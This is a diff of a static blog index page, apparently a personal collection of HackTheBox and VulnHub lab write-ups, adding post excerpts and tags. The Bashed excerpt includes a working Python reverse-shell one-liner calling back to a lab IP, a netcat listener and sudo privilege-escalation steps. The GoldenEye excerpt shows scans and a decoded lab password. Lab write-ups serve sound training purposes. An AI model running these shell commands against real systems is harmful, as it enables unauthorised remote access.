@@ -14,7 +14,7 @@
 <link rel="manifest" href="/manifest.json">
 <link rel="icon" href="/favicon.png" type="image/x-icon">
   <link rel="alternate" hreflang="zh" href="https://xf3n9.github.io/zh/" title="介绍">
-<link rel="stylesheet" href="/book.min.c58292d36b18b675680ab9baea2029204537b839ea72f258746ec0f32ce8d6c8.css" integrity="sha256-xYKS02sYtnVoCrm66iApIEU3uDnqcvJYdG7A8yzo1sg=" crossorigin="anonymous">
+<link rel="stylesheet" href="/book.min.a82d7e77ceb134d151c4d7e381eeb30623fbd5a524d58c584d8716ecec0205bd.css" integrity="sha256-qC1&#43;d86xNNFRxNfjge6zBiP71aUk1YxYTYcW7OwCBb0=" crossorigin="anonymous">
   <script defer src="/flexsearch.min.js"></script>
   <script defer src="/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js" integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2&#43;lMiccGbo=" crossorigin="anonymous"></script>
 
@@ -132,7 +132,7 @@ https://github.com/alex-shpak/hugo-book
   
 
   
-    <a href="/docs/hackthebox/nibbles/" class="">Nibbles</a>
+    <a href="/docs/hackthebox/brainfuck/" class="">Brainfuck</a>
   
 
         </li>
@@ -158,7 +158,7 @@ https://github.com/alex-shpak/hugo-book
   
 
   
-    <a href="/docs/hackthebox/shocker/" class="">Shocker</a>
+    <a href="/docs/hackthebox/nibbles/" class="">Nibbles</a>
   
 
         </li>
@@ -171,7 +171,7 @@ https://github.com/alex-shpak/hugo-book
   
 
   
-    <a href="/docs/hackthebox/brainfuck/" class="">Brainfuck</a>
+    <a href="/docs/hackthebox/shocker/" class="">Shocker</a>
   
 
         </li>
@@ -202,7 +202,7 @@ https://github.com/alex-shpak/hugo-book
   
 
   
-    <a href="/docs/vulnhub/golden-eye/" class="">Golden Eye</a>
+    <a href="/docs/vulnhub/golden-eye/" class="">Golden-Eye</a>
   
 
         </li>
@@ -295,6 +295,11 @@ https://github.com/alex-shpak/hugo-book
       <ul>
       
         <li class="flex justify-between">
+          <a href="/categories/2023-04/">2023-04</a>
+          <span>3</span>
+        </li>
+      
+        <li class="flex justify-between">
           <a href="/categories/2023-03/">2023-03</a>
           <span>1</span>
         </li>
@@ -307,6 +312,36 @@ https://github.com/alex-shpak/hugo-book
     <li class="book-section-flat">
       <strong>Tags</strong>
       <ul>
+      
+        <li class="flex justify-between">
+          <a href="/tags/hydra/">hydra</a>
+          <span>1</span>
+        </li>
+      
+        <li class="flex justify-between">
+          <a href="/tags/moodle/">moodle</a>
+          <span>1</span>
+        </li>
+      
+        <li class="flex justify-between">
+          <a href="/tags/overlayfs/">overlayfs</a>
+          <span>1</span>
+        </li>
+      
+        <li class="flex justify-between">
+          <a href="/tags/phpbash/">phpbash</a>
+          <span>2</span>
+        </li>
+      
+        <li class="flex justify-between">
+          <a href="/tags/revshell/">revshell</a>
+          <span>1</span>
+        </li>
+      
+        <li class="flex justify-between">
+          <a href="/tags/sudo/">sudo</a>
+          <span>1</span>
+        </li>
       
         <li class="flex justify-between">
           <a href="/tags/DTD/">DTD</a>
@@ -344,38 +379,68 @@ https://github.com/alex-shpak/hugo-book
       <a href="/docs/hackthebox/bashed/">Bashed</a>
     </h2>
     
+  <h5>April 2, 2023</h5>
+
 
 
   
+  <div>
+    
+      <a href="/categories/2023-04/">2023-04</a>
+  </div>
+  
 
+  
+  <div>
+    
+      <a href="/tags/phpbash/">phpbash</a>, 
+      <a href="/tags/sudo/">sudo</a>, 
+      <a href="/tags/revshell/">revshell</a>
+  </div>
   
 
 
 
 
-    <p>bashed#
+    <p>HTB: Bashed#Recon#http://10.10.10.68 有一篇关于phpbash的文章
+gobuster -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt /dev页面：
+点击phpbash.php给出一个页面shell，即phpbash
+Phpbash#尝试进入/home目录下的用户目录，成功找到user.txt
+Shell Upgrade#在phpbash中准备：
+python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.157&#34;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39; 在kali中监听：
+nc -nvlp 4444# connect to local from remotepython -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;# pty shell PrivEsc#sudo -lUser www-data may run the following commands on bashed:(scriptmanager : scriptmanager) NOPASSWD: ALL# switch user to scriptmanagersudo -u scriptmanager /bin/bashls -l /scripts# autorun py gen txttest.
+        <a href="/docs/hackthebox/bashed/">...</a>
+      
     </p>
   </article>
   
   <article class="markdown book-post">
     <h2>
-      <a href="/docs/hackthebox/nibbles/">Nibbles</a>
+      <a href="/docs/hackthebox/brainfuck/">Brainfuck</a>
     </h2>
     
+  <h5>April 2, 2023</h5>
+
 
 
   
+  <div>
+    
+      <a href="/categories/2023-04/">2023-04</a>
+  </div>
+  
 
+  
+  <div>
+    
+      <a href="/tags/phpbash/">phpbash</a>
+  </div>
   
 
 
 
 
-    <p>Nibbles is one of the easier boxes on HTB. It hosts a vulnerable instance of nibbleblog. There’s a Metasploit exploit for it, but it’s also easy to do without MSF, so I’ll show both. The privesc involves abusing sudo on a file that is world-writable.
-nmap#An initial nmap scan showed only web/http (80) and ssh (22):
-$ nmap -sV -sC -oA nmap/initial 10.10.10.75 Site - port 80 recon#web root#The root page simply returns a “hello world” message
-        <a href="/docs/hackthebox/nibbles/">...</a>
-      
+    <p>HTB: Brainfuck#
     </p>
   </article>
   
@@ -393,9 +458,28 @@ $ nmap -sV -sC -oA nmap/initial 10.10.10.75 Site - port 80 recon#web root#Th
 
 
 
-    <p>Caput vino delphine in tamen vias#Cognita laeva illo fracta#Lorem markdownum pavent auras, surgit nunc cingentibus libet Laomedonque que est. Pastor An arbor filia foedat, ne fugit aliter, per. Helicona illas et callida neptem est Oresitrophos caput, dentibus est venit. Tenet reddite famuli praesentem fortibus, quaeque vis foret si frondes gelidos gravidae circumtulit inpulit armenta nativum.
-Te at cruciabere vides rubentis manebo Maturuit in praetemptat ruborem ignara postquam habitasse Subitarum supplevit quoque fontesque venabula spretis modo Montis tot est mali quasque gravis Quinquennem domus arsit ipse Pellem turis pugnabant locavit Natus quaerere#Pectora et sine mulcere, coniuge dum tincta incurvae.
-        <a href="/docs/hackthebox/inject/">...</a>
+    <p>HTB: Inject#
+    </p>
+  </article>
+  
+  <article class="markdown book-post">
+    <h2>
+      <a href="/docs/hackthebox/nibbles/">Nibbles</a>
+    </h2>
+    
+
+
+  
+
+  
+
+
+
+
+    <p>HTB: Nibbles#Nibbles is one of the easier boxes on HTB. It hosts a vulnerable instance of nibbleblog. There’s a Metasploit exploit for it, but it’s also easy to do without MSF, so I’ll show both. The privesc involves abusing sudo on a file that is world-writable.
+nmap#An initial nmap scan showed only web/http (80) and ssh (22):
+$ nmap -sV -sC -oA nmap/initial 10.10.10.75 Site - port 80 recon#web root#The root page simply returns a “hello world” message
+        <a href="/docs/hackthebox/nibbles/">...</a>
       
     </p>
   </article>
@@ -414,7 +498,7 @@ Te at cruciabere vides rubentis manebo Maturuit in praetemptat ruborem ignara po
 
 
 
-    <p>HTB:Shocker#The name Shocker gives away pretty quickly what I’ll need to do on this box. There were a couple things to look out for along the way.
+    <p>HTB: Shocker#The name Shocker gives away pretty quickly what I’ll need to do on this box. There were a couple things to look out for along the way.
 be careful when directory brute forcing, as the server is misconfigured in that the cgi-bin directory doesn’t show up without a trailing slash. This means that tools like gobuster and feroxbuster miss it in their default state. I’ll show both manually exploiting ShellShock and using the nmap script to identify it is vulnerable.
         <a href="/docs/hackthebox/shocker/">...</a>
       
@@ -423,21 +507,34 @@ be careful when directory brute forcing, as the server is misconfigured in that 
   
   <article class="markdown book-post">
     <h2>
-      <a href="/docs/hackthebox/brainfuck/">Brainfuck</a>
+      <a href="/docs/vulnhub/golden-eye/">Golden-Eye</a>
     </h2>
     
+  <h5>April 2, 2023</h5>
+
 
 
   
+  <div>
+    
+      <a href="/categories/2023-04/">2023-04</a>
+  </div>
+  
 
+  
+  <div>
+    
+      <a href="/tags/hydra/">hydra</a>, 
+      <a href="/tags/moodle/">moodle</a>, 
+      <a href="/tags/overlayfs/">overlayfs</a>
+  </div>
   
 
 
 
 
-    <p>At me ipso nepotibus nunc celebratior genus#Tanto oblite#Lorem markdownum pectora novis patenti igne sua opus aurae feras materiaque illic demersit imago et aristas questaque posset. Vomit quoque suo inhaesuro clara. Esse cumque, per referri triste. Ut exponit solisque communis in tendens vincetis agisque iamque huic bene ante vetat omina Thebae rates. Aeacus servat admonitu concidit, ad resimas vultus et rugas vultu dignamque Siphnon.
-Quam iugulum regia simulacra, plus meruit humo pecorumque haesit, ab discedunt dixit: ritu pharetramque.
-        <a href="/docs/hackthebox/brainfuck/">...</a>
+    <p>Vulnhub: GoldenEye#Recon#nmap## 主机存活扫描：nmap -sn 10.10.8.0/24# 全端口扫描：nmap --min-rate 10000 -Pn -p- 10.10.8.152PORT STATE SERVICE25/tcp open smtp80/tcp open http55006/tcp open unknown55007/tcp open unknown# 端口服务扫描：nmap -A -sV -T5 10.10.8.152 Web 80#1) 访问80端口，提示Naviagate to /sev-home/ to login// 新标签页打开 http://10.10.8.152/sev-home 2) F12开发者工具，看到terminal.js文件，点击查看 // 获得两个用户名：Boris Natalya// 一个encoded p@ssword：&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;3) URL encode解码工具：// Burpsuite--Decoder--Decode as HTML获得密码：InvincibleHack3r Login
+        <a href="/docs/vulnhub/golden-eye/">...</a>
       
     </p>
   </article>
@@ -480,27 +577,6 @@ DTD，文档类型定义，英文全称：Document Type Definition，应该是�
 漏洞原理：通过向Server提交指定的XML实体内容请求，服务器解析实体内容并进行响应所产生的漏洞。
 现状：目前多数语言默认禁止XML函数解析外部实体，此后漏洞因此得以避免。以PHP为例，libxml用来解析XML，但在PHP&gt;=2.9.0的版本中已默认禁止解析外部实体。
 模拟XXE漏洞，一般通过手动指定libxml_noent选项开启外部实体解析。
-    </p>
-  </article>
-  
-  <article class="markdown book-post">
-    <h2>
-      <a href="/docs/vulnhub/golden-eye/">Golden Eye</a>
-    </h2>
-    
-
-
-  
-
-  
-
-
-
-
-    <p>GoldenEye#Nefas discordemque domino montes numen tum humili nexilibusque exit, Iove. Quae miror esse, scelerisque Melaneus viribus. Miseri laurus. Hoc est proposita me ante aliquid, aura inponere candidioribus quidque accendit bella, sumpta. Intravit quam erat figentem hunc, motus de fontes parvo tempestate.
-iscsi_virus = pitch(json_in_on(eupViral),northbridge_services_troubleshooting, personal(firmware_rw.trash_rw_crm.device(interactive_gopher_personal,software, -1), megabit, ergonomicsSoftware(cmyk_usb_panel,mips_whitelist_duplex, cpa)));if (5) {managementNetwork += dma - boolean;kilohertz_token = 2;honeypot_affiliate_ergonomics = fiber;}mouseNorthbridge = byte(nybble_xmp_modem.
-        <a href="/docs/vulnhub/golden-eye/">...</a>
-      
     </p>
   </article>
   
@@ -548,6 +624,11 @@ iscsi_virus = pitch(json_in_on(eupViral),northbridge_services_troubleshooting, 
       <ul>
       
         <li class="flex justify-between">
+          <a href="/categories/2023-04/">2023-04</a>
+          <span>3</span>
+        </li>
+      
+        <li class="flex justify-between">
           <a href="/categories/2023-03/">2023-03</a>
           <span>1</span>
         </li>
@@ -560,6 +641,36 @@ iscsi_virus = pitch(json_in_on(eupViral),northbridge_services_troubleshooting, 
     <li class="book-section-flat">
       <strong>Tags</strong>
       <ul>
+      
+        <li class="flex justify-between">
+          <a href="/tags/hydra/">hydra</a>
+          <span>1</span>
+        </li>
+      
+        <li class="flex justify-between">
+          <a href="/tags/moodle/">moodle</a>
+          <span>1</span>
+        </li>
+      
+        <li class="flex justify-between">
+          <a href="/tags/overlayfs/">overlayfs</a>
+          <span>1</span>
+        </li>
+      
+        <li class="flex justify-between">
+          <a href="/tags/phpbash/">phpbash</a>
+          <span>2</span>
+        </li>
+      
+        <li class="flex justify-between">
+          <a href="/tags/revshell/">revshell</a>
+          <span>1</span>
+        </li>
+      
+        <li class="flex justify-between">
+          <a href="/tags/sudo/">sudo</a>
+          <span>1</span>
+        </li>
       
         <li class="flex justify-between">
           <a href="/tags/DTD/">DTD</a>
